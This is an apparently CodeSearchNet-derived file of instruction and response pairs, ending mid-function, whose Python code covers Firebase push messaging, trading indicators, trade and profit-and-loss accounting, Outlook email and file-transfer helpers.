{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsends a push message to a single device.", "response": "def fcm_send_single_device_data_message(\n        registration_id,\n        condition=None,\n        collapse_key=None,\n        delay_while_idle=False,\n        time_to_live=None,\n        restricted_package_name=None,\n        low_priority=False,\n        dry_run=False,\n        data_message=None,\n        content_available=None,\n        api_key=None,\n        timeout=5,\n        json_encoder=None):\n    \"\"\"\n    Send push message to a single device\n    All arguments correspond to that defined in pyfcm/fcm.py.\n\n    Args:\n        registration_id (str): FCM device registration IDs.\n        data_message (dict): Data message payload to send alone or with the\n            notification message\n\n    Keyword Args:\n        collapse_key (str, optional): Identifier for a group of messages\n            that can be collapsed so that only the last message gets sent\n            when delivery can be resumed. Defaults to ``None``.\n        delay_while_idle (bool, optional): If ``True`` indicates that the\n            message should not be sent until the device becomes active.\n        time_to_live (int, optional): How long (in seconds) the message\n            should be kept in FCM storage if the device is offline. The\n            maximum time to live supported is 4 weeks. Defaults to ``None``\n            which uses the FCM default of 4 weeks.\n        low_priority (boolean, optional): Whether to send notification with\n            the low priority flag. Defaults to ``False``.\n        restricted_package_name (str, optional): Package name of the\n            application where the registration IDs must match in order to\n            receive the message. Defaults to ``None``.\n        dry_run (bool, optional): If ``True`` no message will be sent but\n            request will be tested.\n        timeout (int, optional): set time limit for the request\n    Returns:\n        :dict:`multicast_id(long), success(int), failure(int),\n            canonical_ids(int), results(list)`:\n        Response from FCM server.\n\n    Raises:\n        AuthenticationError: If :attr:`api_key` is not set or provided or there\n            is an error authenticating the sender.\n        FCMServerError: Internal server error or timeout error on Firebase cloud\n            messaging server\n        InvalidDataError: Invalid data provided\n        InternalPackageError: Mostly from changes in the response of FCM,\n            contact the project owner to resolve the issue\n    \"\"\"\n    push_service = FCMNotification(\n        api_key=SETTINGS.get(\"FCM_SERVER_KEY\") if api_key is None else api_key,\n        json_encoder=json_encoder,\n    )\n    return push_service.single_device_data_message(\n        registration_id=registration_id,\n        condition=condition,\n        collapse_key=collapse_key,\n        delay_while_idle=delay_while_idle,\n        time_to_live=time_to_live,\n        restricted_package_name=restricted_package_name,\n        low_priority=low_priority,\n        dry_run=dry_run,\n        data_message=data_message,\n        content_available=content_available,\n        timeout=timeout\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsending a push message to multiple FCM devices.", "response": "def fcm_send_bulk_data_messages(\n            api_key,\n            registration_ids=None,\n            condition=None,\n            collapse_key=None,\n            delay_while_idle=False,\n            time_to_live=None,\n            restricted_package_name=None,\n            low_priority=False,\n            dry_run=False,\n            data_message=None,\n            content_available=None,\n            timeout=5,\n            json_encoder=None):\n    \"\"\"\n    Arguments correspond to those from pyfcm/fcm.py.\n\n    Sends push message to multiple devices,\n    can send to over 1000 devices\n\n    Args:\n        api_key\n        registration_ids (list): FCM device registration IDs.\n        data_message (dict): Data message payload to send alone or with the notification message\n\n    Keyword Args:\n        collapse_key (str, optional): Identifier for a group of messages\n            that can be collapsed so that only the last message gets sent\n            when delivery can be resumed. Defaults to ``None``.\n        delay_while_idle (bool, optional): If ``True`` indicates that the\n            message should not be sent until the device becomes active.\n        time_to_live (int, optional): How long (in seconds) the message\n            should be kept in FCM storage if the device is offline. The\n            maximum time to live supported is 4 weeks. Defaults to ``None``\n            which uses the FCM default of 4 weeks.\n        low_priority (boolean, optional): Whether to send notification with\n            the low priority flag. Defaults to ``False``.\n        restricted_package_name (str, optional): Package name of the\n            application where the registration IDs must match in order to\n            receive the message. Defaults to ``None``.\n        dry_run (bool, optional): If ``True`` no message will be sent but\n            request will be tested.\n    Returns:\n        :tuple:`multicast_id(long), success(int), failure(int), canonical_ids(int), results(list)`:\n        Response from FCM server.\n\n    Raises:\n        AuthenticationError: If :attr:`api_key` is not set or provided or there is an error authenticating the sender.\n        FCMServerError: Internal server error or timeout error on Firebase cloud messaging server\n        InvalidDataError: Invalid data provided\n        InternalPackageError: JSON parsing error, mostly from changes in the response of FCM, create a new github issue to resolve it.\n    \"\"\"\n    push_service = FCMNotification(\n        api_key=SETTINGS.get(\"FCM_SERVER_KEY\") if api_key is None else api_key,\n        json_encoder=json_encoder,\n    )\n    return push_service.multiple_devices_data_message(\n        registration_ids=registration_ids,\n        condition=condition,\n        collapse_key=collapse_key,\n        delay_while_idle=delay_while_idle,\n        time_to_live=time_to_live,\n        restricted_package_name=restricted_package_name,\n        low_priority=low_priority,\n        dry_run=dry_run,\n        data_message=data_message,\n        content_available=content_available,\n        timeout=timeout\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nuse dynamic programming to infer the location of spaces in a string without spaces.", "response": "def split(s):\n  \"\"\"Uses dynamic programming to infer the location of spaces in a string without spaces.\"\"\"\n  l = [_split(x) for x in _SPLIT_RE.split(s)]\n  return [item for sublist in l for item in sublist]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the n day mean", "response": "def sma(arg, n):\n    \"\"\" If n is 0 then return the ltd mean; else return the n day mean \"\"\"\n    if n == 0:\n        return pd.expanding_mean(arg)\n    else:\n        return pd.rolling_mean(arg, n, min_periods=n)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the true range of the given columns.", "response": "def true_range(arg, high_col='high', low_col='low', close_col='close', skipna=0):\n    \"\"\"\n    http://en.wikipedia.org/wiki/Average_true_range\n    The greatest of the following:\n    - Current High less the current Low\n    - Current High less the previous Close (absolute value)\n    - Curre    nt Low less the previous Close (absolute value)\n    \"\"\"\n    _ensure_col(arg, high_col=high_col, low_col=low_col, close_col=close_col)\n    yclose = arg[close_col].shift(1)\n    low, high = arg[low_col], arg[high_col]\n    mx = pd.DataFrame({'a': high, 'b': yclose}).max(axis=1, skipna=skipna)\n    mn = pd.DataFrame({'a': low, 'b': yclose}).min(axis=1, skipna=skipna)\n    result = mx - mn\n    return pd.Series(result, index=arg.index, name='true_range')"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the dmi + dmi - average directional index.", "response": "def dmi(arg, n, high_col='high', low_col='low', close_col='close'):\n    \"\"\" Return the dmi+, dmi-, Average directional index\n    ( http://en.wikipedia.org/wiki/Average_Directional_Index )\n        TODO - break up calcuat\n    \"\"\"\n    converted = arg[[close_col, high_col, low_col]]\n    converted.columns = ['close', 'high', 'low']\n\n    up_mv = converted.high.diff()\n    dn_mv = -1 * converted.low.diff()\n    up_mv[~((up_mv > 0) & (up_mv > dn_mv))] = 0\n    dn_mv[~((dn_mv > 0) & (dn_mv > up_mv))] = 0\n\n    tr = true_range(converted, 'high', 'low', 'close')\n    atr = wilderma(tr, n)\n\n    di_pos = 100. * wilderma(up_mv, n) / atr\n    di_neg = 100. * wilderma(dn_mv, n) / atr\n    dx = 100. * np.abs(di_pos - di_neg) / (di_pos + di_neg)\n    adx = wilderma(dx, n)\n\n    data = [\n        ('DI+', di_pos),\n        ('DI-', di_neg),\n        ('DX', dx),\n        ('ADX', adx),\n    ]\n    return pd.DataFrame.from_items(data)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncompute RSI for the given arg", "response": "def rsi(arg, n):\n    \"\"\" compute RSI for the given arg\n\n    arg: Series or DataFrame\n    \"\"\"\n    if isinstance(arg, pd.DataFrame):\n        cols = [(name, rsi(arg[name], n)) for name in arg.columns]\n        return pd.DataFrame.from_items(cols)\n    else:\n        assert isinstance(arg, pd.Series)\n        n = int(n)\n        converted = arg.dropna()\n        change = converted.diff()\n        gain = change.apply(lambda c: c > 0 and c or 0)\n        avgGain = wilderma(gain, n)\n        loss = change.apply(lambda c: c < 0 and abs(c) or 0)\n        avgLoss = wilderma(loss, n)\n\n        result = avgGain / avgLoss\n        result[result == np.inf] = 100.  # divide by zero\n        result = 100. - (100. / (1. + result))\n        return pd.Series(result, index=converted.index).reindex(arg.index)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a signal with the following crosses the two values of s1 and s2.", "response": "def cross_signal(s1, s2, continuous=0):\n    \"\"\" return a signal with the following\n    1 : when all values of s1 cross all values of s2\n    -1 : when all values of s2 cross below all values of s2\n    0 : if s1 < max(s2) and s1 > min(s2)\n    np.nan : if s1 or s2 contains np.nan at position\n\n\n    s1: Series, DataFrame, float, int, or tuple(float|int)\n    s2: Series, DataFrame, float, int, or tuple(float|int)\n    continous: bool, if true then once the signal starts it is always 1 or -1\n    \"\"\"\n\n    def _convert(src, other):\n        if isinstance(src, pd.DataFrame):\n            return src.min(axis=1, skipna=0), src.max(axis=1, skipna=0)\n        elif isinstance(src, pd.Series):\n            return src, src\n        elif isinstance(src, (int, float)):\n            s = pd.Series(src, index=other.index)\n            return s, s\n        elif isinstance(src, (tuple, list)):\n            l, u = min(src), max(src)\n            assert l <= u, 'lower bound must be less than upper bound'\n            lower, upper = pd.Series(l, index=other.index), pd.Series(u, index=other.index)\n            return lower, upper\n        else:\n            raise Exception('unable to handle type %s' % type(src))\n\n    lower1, upper1 = _convert(s1, s2)\n    lower2, upper2 = _convert(s2, s1)\n\n    df = pd.DataFrame({'upper1': upper1, 'lower1': lower1, 'upper2': upper2, 'lower2': lower2})\n    df.ffill(inplace=True)\n\n    signal = pd.Series(np.nan, index=df.index)\n    signal[df.upper1 > df.upper2] = 1\n    signal[df.lower1 < df.lower2] = -1\n\n    if continuous:\n        # Just roll with 1, -1\n        signal = signal.fillna(method='ffill')\n        m1, m2 = df.upper1.first_valid_index(), df.upper2.first_valid_index()\n        if m1 is not None or m2 is not None:\n            m1 = m2 if m1 is None else m1\n            m2 = m1 if m2 is None else m2\n            fv = max(m1, m2)\n            if np.isnan(signal[fv]):\n                signal[fv] = 0\n                signal.ffill(inplace=1)\n    else:\n        signal[(df.upper1 < df.upper2) & (df.lower1 > df.lower2)] = 0\n        # special handling when equal, determine where it previously was\n        eq = (df.upper1 == df.upper2)\n        if eq.any():  # Set to prior value\n            tmp = signal[eq]\n            for i in tmp.index:\n                loc = signal.index.get_loc(i)\n                if loc != 0:\n                    u, l = df.upper2.iloc[loc], df.lower2.iloc[loc]\n                    ps = signal.iloc[loc - 1]\n                    if u == l or ps == 1.:  # Line coming from above upper bound if ps == 1\n                        signal[i] = ps\n                    else:\n                        signal[i] = 0\n\n        eq = (df.lower1 == df.lower2)\n        if eq.any():  # Set to prior value\n            tmp = signal[eq]\n            for i in tmp.index:\n                loc = signal.index.get_loc(i)\n                if loc != 0:\n                    u, l = df.upper2.iloc[loc], df.lower2.iloc[loc]\n                    ps = signal.iloc[loc - 1]\n                    if u == l or ps == -1.:  # Line coming from below lower bound if ps == -1\n                        signal[i] = ps\n                    else:\n                        signal[i] = 0\n\n    return signal"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef close_to_close(self, pxs):\n        if not isinstance(pxs, pd.Series):\n            raise ValueError('pxs expected to be Series')\n\n        blotter = TradeBlotter()\n        signal = self.signal.dropna()\n        diff = signal.diff()\n        diff.iloc[0] = 0\n        changes = signal[diff != 0]\n        lsig = 0\n        qtyfct = self._qty_fct(pxs.index)\n        for ts, sig in changes.iteritems():\n            blotter.ts = ts\n            if sig != lsig:\n                px = pxs.get(ts, None)\n                if px is None:\n                    raise Exception('insufficient price data: no data found at %s' % ts)\n                if lsig != 0:  # close open trd\n                    blotter.close(px=px)\n\n                if sig != 0:\n                    size = abs(qtyfct(ts))\n                    qty = sig > 0 and size or -size\n                    blotter.open(qty, px)\n            lsig = sig\n        return blotter.trades", "response": "close to close the trades in the given series"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nretrieves the attributes of the specified sids and return a DataFrame with the same columns and sids as the row indices.", "response": "def get_attributes(self, sids, flds, **overrides):\n        \"\"\"Check cache first, then defer to data manager\n        :param sids: security identifiers\n        :param flds: fields to retrieve\n        :param overrides: key-value pairs to pass to the mgr get_attributes method\n        :return: DataFrame with flds as columns and sids as the row indices\n        \"\"\"\n        # Unfortunately must be inefficient with request\n        flds = _force_array(flds)\n        sids = _force_array(sids)\n        cached = self._cache_get_attribute(sids, flds, **overrides)\n        if not cached:  # build get\n            df = self.dm.get_attributes(sids, flds, **overrides)\n            [self._cache_update_attribute(sid, df.ix[sid:sid], **overrides) for sid in sids]\n            return df\n        else:\n            # Retrieve all missing and merge with existing cache\n            for sid in sids:\n                missed = flds if sid not in cached else set(flds) - set(cached[sid].columns)\n                if missed:\n                    df = self.dm.get_attributes(sid, missed, **overrides)\n                    self._cache_update_attribute(sid, df, **overrides)\n\n            # now just retrieve from cache\n            data = self._cache_get_attribute(sids, flds, **overrides)\n            # reindex and grab columns to sort\n            frame = pd.concat(data.values())\n            return frame"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef iter_txns(trds):\n    pos = 0\n    for trd in trds:\n        if pos != 0 and is_decrease(pos, trd.qty) and crosses_zero(pos, trd.qty):\n            # Split to make accounting for long/short possible\n            closing_trd, opening_trd = trd.split(-pos)\n            # setattr(closing_trd, '_txn_id', 1)\n            # setattr(opening_trd, '_txn_id', 2)\n            yield closing_trd\n            pos = opening_trd.qty\n            yield opening_trd\n        else:\n            pos += trd.qty\n            yield trd", "response": "iterator of trades which splits trades to ensure proper long or short accounting"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconverting the trades to transaction level details necessary for long or short accouting.", "response": "def frame(self):\n        \"\"\"Convert the trades to transaction level details necessary for long/short accouting.\n\n        :param trades:\n        :param pricer: provides the interface to get premium for a specified quanity, price, and timestamp.\n        :return:\n        \"\"\"\n        rows = []\n        pricer = self.pricer\n        pos = open_val = pid = 0\n        for txn in self.trades:\n            # These values always get copied\n            qty = txn.qty\n            premium = pricer.get_premium(qty, txn.px, ts=txn.ts)\n            if pos == 0:  # Open position\n                side = qty > 0 and Action.Buy or Action.SellShort\n                open_val = premium\n                pid += 1\n                side = side\n                intent = Intent.Open\n                pos = qty\n            elif pos + qty == 0:  # close position\n                side = qty > 0 and Action.Cover or Action.Sell\n                open_val = 0\n                side = side\n                intent = Intent.Close\n                pos = 0\n            elif is_increase(pos, qty):\n                side = txn.qty > 0 and Action.Buy or Action.SellShort\n                open_val += premium\n                pos += qty\n                intent = Intent.Increase\n                side = side\n            else:  # decrease - no worries about split since iterator takes care of it\n                side = txn.qty > 0 and Action.Cover or Action.Sell\n                open_val *= ((pos + qty) / pos)\n                pos += qty\n                intent = Intent.Decrease\n                side = side\n\n            # Get rid of anything but the date\n            dt = txn.ts.to_period('B').to_timestamp()\n            rows.append([dt, txn.ts, pid, txn.tid, txn.qty, txn.px, txn.fees, premium, open_val, pos, intent, side])\n\n        df = pd.DataFrame.from_records(rows, columns=[TC.DT, TC.TS, TC.PID, TC.TID, TC.QTY, TC.PX, TC.FEES, TC.PREMIUM,\n                                                      TC.OPEN_VAL, TC.POS, TC.INTENT, TC.ACTION])\n        df.index.name = 'seq'\n        return df"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef send_outlook_email(to, subject, body, attachments=None, cc=None, bcc=None, is_html=0):\n    import win32com.client\n    asarr = lambda v: None if not v else isinstance(v, basestring) and [v] or v\n    def update_recipients(robj, users, type):\n        users = asarr(to)\n        if users:\n            for u in users:\n                r = robj.Add(u)\n                r.Type = type\n\n    outlook = win32com.client.gencache.EnsureDispatch(\"Outlook.Application\")\n    mapi = outlook.GetNamespace(\"MAPI\")\n    constants = win32com.client.constants\n    msg = outlook.CreateItem(0)\n    # setup the recipients\n    recipients = msg.Recipients\n    to and update_recipients(recipients, to, constants.olTo)\n    cc and update_recipients(recipients, cc, constants.olCC)\n    bcc and update_recipients(recipients, bcc, constants.olBCC)\n    recipients.ResolveAll()\n    msg.Subject = subject\n    if is_html:\n        msg.BodyFormat = constants.olFormatHTML\n        msg.HTMLBody = body\n    else:\n        msg.Body = body\n\n    map(lambda fpath: msg.Attachments.Add(fpath), attachments or [])\n    msg.Send()", "response": "Send an email using the local outlook client"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds the dict of downloads.", "response": "def add_downloads(self, filemap):\n        \"\"\"Add the dict of downloads. (Note the Winscp command line accepts wildcards)\n\n        Parameters\n        ----------\n        filemap: dict, (remote_filename -> local_filename)\n        \"\"\"\n        [self.add_download(k, v) for k, v in filemap.iteritems()]"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nadd the dict of uploads to the current session", "response": "def add_uploads(self, filemap):\n        \"\"\"Add the dict of uploads\n\n        Parameters\n        ----------\n        filemap: dict, (remote_filename -> local_filename)\n        \"\"\"\n        [self.add_upload(k, v) for k, v in filemap.iteritems()]"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the daily return series based on the initial capital", "response": "def return_on_initial_capital(capital, period_pl, leverage=None):\n    \"\"\"Return the daily return series based on the capital\"\"\"\n    if capital <= 0:\n        raise ValueError('cost must be a positive number not %s' % capital)\n    leverage = leverage or 1.\n    eod = capital + (leverage * period_pl.cumsum())\n    ltd_rets = (eod / capital) - 1.\n    dly_rets = ltd_rets\n    dly_rets.iloc[1:] = (1. + ltd_rets).pct_change().iloc[1:]\n    return dly_rets"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef iter_by_year(self):\n        for key, grp in self.rets.groupby(lambda x: x.year):\n            yield key, CumulativeRets(rets=grp)", "response": "Split the return objects by year and iterate"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef iter_by_year(self):\n        for yr, details in self.txn_details.iter_by_year():\n            yield yr, Performance(details)", "response": "Split the return objects by year and iterate"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _listWrapOn(F, availWidth, canv, mergeSpace=1, obj=None, dims=None):\n    '''return max width, required height for a list of flowables F'''\n    doct = getattr(canv, '_doctemplate', None)\n    cframe = getattr(doct, 'frame', None)\n    if cframe:\n        from reportlab.platypus.doctemplate import _addGeneratedContent, Indenter\n\n        doct_frame = cframe\n        from copy import deepcopy\n\n        cframe = doct.frame = deepcopy(doct_frame)\n        cframe._generated_content = None\n        del cframe._generated_content\n    try:\n        W = 0\n        H = 0\n        pS = 0\n        atTop = 1\n        F = F[:]\n        while F:\n            f = F.pop(0)\n            if hasattr(f, 'frameAction'):\n                from reportlab.platypus.doctemplate import Indenter\n\n                if isinstance(f, Indenter):\n                    availWidth -= f.left + f.right\n                continue\n            w, h = f.wrapOn(canv, availWidth, 0xfffffff)\n            if dims is not None: dims.append((w, h))\n            if cframe:\n                _addGeneratedContent(F, cframe)\n            if w <= fl._FUZZ or h <= fl._FUZZ: continue\n            #\n            # THE HACK\n            #\n            # W = max(W,min(availWidth, w))\n            W = max(W, w)\n            H += h\n            if not atTop:\n                h = f.getSpaceBefore()\n                if mergeSpace:\n                    if getattr(f, '_SPACETRANSFER', False):\n                        h = pS\n                    h = max(h - pS, 0)\n                H += h\n            else:\n                if obj is not None: obj._spaceBefore = f.getSpaceBefore()\n                atTop = 0\n            s = f.getSpaceAfter()\n            if getattr(f, '_SPACETRANSFER', False):\n                s = pS\n            pS = s\n            H += pS\n        if obj is not None: obj._spaceAfter = pS\n        return W, H - pS\n    finally:\n        if cframe:\n            doct.frame = doct_frame", "response": "return max width required height for a list of flowables F"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconstruct a new Positions object from the new Txns object which is assumed to be a subset of the current Positions object", "response": "def subset(self, subtxns):\n        \"\"\"Construct a new Positions object from the new Txns object (which is assumed to be a subset)\n        of current Txns object\"\"\"\n        result = Positions(subtxns)\n        if hasattr(self, '_frame'):\n            result._frame = self._frame.ix[subtxns.pids]\n            # passing in array results in index name being removed for some reason???\n            if result._frame.index.name != self._frame.index.name:\n                result._frame.index.name = self._frame.index.name\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef plot_rets(self, ls=1, ax=None):\n        import matplotlib.pyplot as plt\n        from tia.util.mplot import AxesFormat\n\n        if ax is None:\n            ax = plt.gca()\n\n        frame = self.frame\n\n        if not ls:\n            ax.scatter(frame.index, frame.ret, c='k', marker='o', label='All')\n        else:\n            if len(self.long_pids) > 0:\n                lframe = frame.ix[frame.index.isin(self.long_pids)]\n                ax.scatter(lframe.index, lframe.ret, c='k', marker='o', label='Long')\n            if len(self.short_pids) > 0:\n                sframe = frame.ix[frame.index.isin(self.short_pids)]\n                ax.scatter(sframe.index, sframe.ret, c='r', marker='o', label='Short')\n\n        # set some boundaries\n        AxesFormat().Y.percent().apply()\n        ax.set_xlim(0, frame.index.max() + 3)\n        ax.set_xlabel('pid')\n        ax.set_ylabel('return')\n        ax.legend(loc='upper left')\n        return ax", "response": "Plot each of the position returns"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nplots the return range for each position in the sequence.", "response": "def plot_ret_range(self, ax=None, ls=0, dur=0):\n        \"\"\"Plot the return range for each position\n\n        :param ax: Axes\n        \"\"\"\n        import matplotlib.pyplot as plt\n        from tia.util.mplot import AxesFormat\n\n        if ax is None:\n            ax = plt.gca()\n\n        frame = self.frame\n        pids = frame.index\n\n        min_rets = pd.Series([self[pid].performance.ltd_txn.min() for pid in pids], index=pids)\n        max_rets = pd.Series([self[pid].performance.ltd_txn.max() for pid in pids], index=pids)\n\n        if not ls:\n            s = frame.duration + 20 if dur else 20\n            ax.scatter(frame.index, frame.ret, s=s, c='k', marker='o', label='All')\n            ax.vlines(pids, min_rets, max_rets)\n        else:\n            if len(self.long_pids) > 0:\n                lframe = frame.ix[frame.index.isin(self.long_pids)]\n                s = lframe.duration + 20 if dur else 20\n                ax.scatter(lframe.index, lframe.ret, s=s, c='k', marker='o', label='Long')\n                ax.vlines(lframe.index, min_rets[lframe.index], max_rets[frame.index])\n            if len(self.short_pids) > 0:\n                sframe = frame.ix[frame.index.isin(self.short_pids)]\n                s = sframe.duration + 20 if dur else 20\n                ax.scatter(sframe.index, sframe.ret, s=s, c='r', marker='o', label='Short')\n                ax.vlines(sframe.index, min_rets[sframe.index], max_rets[sframe.index])\n\n        AxesFormat().Y.percent().apply()\n        ax.axhline(color='k', linestyle='--')\n        ax.set_xlim(0, frame.index.max() + 3)\n        ax.set_xlabel('pid')\n        ax.set_ylabel('return')\n        ax.legend(loc='upper left')\n        return ax"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef consecutive_frame(self):\n        if self._frame.empty:\n            return pd.DataFrame(columns=['pids', 'pl', 'cnt', 'is_win'])\n        else:\n            vals = (self._frame[PC.RET] >= 0).astype(int)\n            seq = (vals.shift(1) != vals).astype(int).cumsum()\n\n            def _do_apply(sub):\n                return pd.Series({\n                    'pids': sub.index.values,\n                    'pl': sub[PC.PL].sum(),\n                    'cnt': len(sub.index),\n                    'is_win': sub[PC.RET].iloc[0] >= 0,\n                })\n\n            return self._frame.groupby(seq).apply(_do_apply)", "response": "Return a DataFrame with columns cnt pids pl. cnt is the number of pids in the sequence pl is the sum of the pls in the sequence. is_win is the number of winners in the sequence."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef compute(self, txns):\n        txndata = txns.frame\n        mktdata = txns.pricer.get_eod_frame()\n        if not isinstance(mktdata.index, pd.DatetimeIndex):\n            mktdata.to_timestamp(freq='B')\n\n        # get the set of all txn dts and mkt data dts\n        pl = pd.merge(txndata, mktdata.reset_index(), how='outer', on=TPL.DT)\n        if pl[TC.PID].isnull().all():\n            ltd_frame = pd.DataFrame(index=pl.index)\n            ltd_frame[TPL.DT] = pl[PL.DT]\n            ltd_frame[TPL.POS] = 0\n            ltd_frame[TPL.PID] = 0\n            ltd_frame[TPL.TID] = 0\n            ltd_frame[TPL.TXN_QTY] = np.nan\n            ltd_frame[TPL.TXN_PX] = np.nan\n            ltd_frame[TPL.TXN_FEES] = 0\n            ltd_frame[TPL.TXN_PREMIUM] = 0\n            ltd_frame[TPL.TXN_INTENT] = 0\n            ltd_frame[TPL.TXN_ACTION] = 0\n            ltd_frame[TPL.CLOSE_PX] = pl[TPL.CLOSE_PX]\n            ltd_frame[TPL.OPEN_VAL] = 0\n            ltd_frame[TPL.MKT_VAL] = 0\n            ltd_frame[TPL.TOT_VAL] = 0\n            ltd_frame[TPL.DVDS] = 0\n            ltd_frame[TPL.FEES] = 0\n            ltd_frame[TPL.RPL_GROSS] = 0\n            ltd_frame[TPL.RPL] = 0\n            ltd_frame[TPL.UPL] = 0\n            ltd_frame[TPL.PL] = 0\n            return ltd_frame\n        else:\n            pl.sort([TC.DT, TC.PID, TC.TID], inplace=1)\n            pl.reset_index(inplace=1, drop=1)\n            # check that all days can be priced\n            has_position = pl[TC.PID] > 0\n            missing_pxs = pl[MC.CLOSE].isnull()\n            missing = pl[TC.DT][has_position & missing_pxs]\n            if len(missing) > 0:\n                msg = 'insufficient price data: {0} prices missing for dates {1}'\n                mdates = ','.join([_.strftime('%Y-%m-%d') for _ in set(missing[:5])])\n                mdates += (len(missing) > 5 and '...' or '')\n                raise Exception(msg.format(len(missing), mdates))\n\n            # Now there is a row for every timestamp. Now compute the pl and fill in where missing data should be\n            cols = [TC.DT, TC.POS, TC.PID, TC.TID, TC.INTENT, TC.ACTION, TC.FEES, TC.QTY, TC.PX, TC.PREMIUM,\n                    TC.OPEN_VAL]\n            dts, pos_qtys, pids, tids, intents, sides, txn_fees, txn_qtys, txn_pxs, premiums, open_vals = [pl[c] for c\n                                                                                                           in\n                                                                                                           cols]\n\n            dvds, closing_pxs, mkt_vals = [pl[c] for c in [MC.DVDS, MC.CLOSE, MC.MKT_VAL]]\n            # Ensure only end of day is kept for dividends (join will match dvd to any transaction during day\n            dvds = dvds.where(dts != dts.shift(-1), 0)\n            # fill in pl dates\n            open_vals.ffill(inplace=1)\n            open_vals.fillna(0, inplace=1)\n            pos_qtys.ffill(inplace=1)\n            pos_qtys.fillna(0, inplace=1)\n            # pid is the only tricky one, copy only while position is open\n            inpos = intents.notnull() | (pos_qtys != 0)\n            pids = np.where(inpos, pids.ffill(), 0)\n            pl['pid'] = pids.astype(int)\n            # Zero fill missing\n            dvds.fillna(0, inplace=1)\n            tids.fillna(0, inplace=1)\n            tids = tids.astype(int)\n            intents.fillna(0, inplace=1)\n            intents = intents.astype(int)\n            sides.fillna(0, inplace=1)\n            sides = sides.astype(int)\n            txn_fees.fillna(0, inplace=1)\n            premiums.fillna(0, inplace=1)\n            # LTD p/l calculation\n            fees = txn_fees.cumsum()\n            total_vals = premiums.cumsum()\n            mkt_vals *= pos_qtys\n            dvds = (dvds * pos_qtys).cumsum()\n            rpl_gross = total_vals - open_vals\n            rpl = rpl_gross + fees + dvds\n            upl = mkt_vals + open_vals\n            tpl = upl + rpl\n            # build the result\n            data = OrderedDict()\n            data[TPL.DT] = dts\n            data[TPL.POS] = pos_qtys\n            data[TPL.PID] = pids\n            data[TPL.TID] = tids\n            data[TPL.TXN_QTY] = txn_qtys\n            data[TPL.TXN_PX] = txn_pxs\n            data[TPL.TXN_FEES] = txn_fees\n            data[TPL.TXN_PREMIUM] = premiums\n            data[TPL.TXN_INTENT] = intents\n            data[TPL.TXN_ACTION] = sides\n            data[TPL.CLOSE_PX] = closing_pxs\n            data[TPL.OPEN_VAL] = open_vals\n            data[TPL.MKT_VAL] = mkt_vals\n            data[TPL.TOT_VAL] = total_vals\n            data[TPL.DVDS] = dvds\n            data[TPL.FEES] = fees\n            data[TPL.RPL_GROSS] = rpl_gross\n            data[TPL.RPL] = rpl\n            data[TPL.UPL] = upl\n            data[TPL.PL] = tpl\n            ltd_frame = pd.DataFrame(data, columns=data.keys())\n            return ltd_frame", "response": "Compute the long - to - date transaction level profit and loss. Uses an open average calculation."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef asfreq(self, freq):\n        frame = self.frame\n        if freq == 'B':\n            resampled = frame.groupby(frame.index.date).apply(lambda f: f.sum())\n            resampled.index = pd.DatetimeIndex([i for i in resampled.index])\n            return ProfitAndLossDetails(resampled)\n        else:\n            resampled = frame.resample(freq, how='sum')\n            return ProfitAndLossDetails(resampled)", "response": "Resample the p&l at the specified frequency"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsummarizing profit and loss by year and return a DataFrame of the results.", "response": "def report_by_year(self, summary_fct=None, years=None, ltd=1, prior_n_yrs=None, first_n_yrs=None, ranges=None,\n                       bm_rets=None):\n        \"\"\"Summarize the profit and loss by year\n        :param summary_fct: function(ProfitAndLoss) and returns a dict or Series\n        :param years: int, array, boolean or None. If boolean and False, then show no years. If int or array\n                      show only those years, else show all years if None\n        :param ltd: include live to date summary\n        :param prior_n_years: integer or list. Include summary for N years of return data prior to end date\n        :param first_n_years: integer or list. Include summary for N years of return data after start date\n        :param ranges: list of ranges. The range consists of a year start and year end\n        :param dm_dly_rets: daily return series for the benchmark for beta/alpha calcs\n        :return: DataFrame\n        \"\"\"\n        if years and np.isscalar(years):\n            years = [years]\n\n        if summary_fct is None:\n            def summary_fct(pl):\n                monthly = pl.monthly_details\n                dly = pl.dly_details\n                data = OrderedDict()\n                data['mpl avg'] = monthly.mean\n                data['mpl std ann'] = monthly.std_ann\n                data['maxdd'] = dly.maxdd\n                data['maxdd dt'] = dly.maxdd_dt\n                data['avg dd'] = dly.dd_avg\n                data['best month'] = monthly.max\n                data['worst month'] = monthly.min\n                data['best day'] = dly.max\n                data['worst day'] = dly.min\n                data['nmonths'] = monthly.cnt\n                return data\n\n        results = OrderedDict()\n\n        if years is not False:\n            for yr, pandl in self.iter_by_year():\n                if years is None or yr in years:\n                    results[yr] = summary_fct(pandl)\n\n        # First n years\n        